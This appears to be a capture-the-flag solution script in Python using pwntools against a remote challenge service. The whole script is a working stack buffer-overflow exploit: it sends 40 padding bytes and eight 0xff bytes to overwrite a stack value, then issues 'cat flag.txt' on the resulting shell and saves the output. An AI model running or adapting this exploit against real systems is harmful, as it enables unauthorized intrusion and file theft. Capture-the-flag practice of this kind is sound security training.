# target: rbp-0x8
from pwn import *

payload = 'A' * 40
payload = payload.encode()
payload += b'\xff\xff\xff\xff\xff\xff\xff\xff'

cmd = "cat flag.txt"

s = remote('mc.ax', 31199)

s.recv()

s.sendline(payload)

s.sendline(cmd.encode())

flag = s.recv().decode()

#s.interactive()

s.close()

print(flag)

with open('flag.txt', 'w') as f:
    f.write(flag)
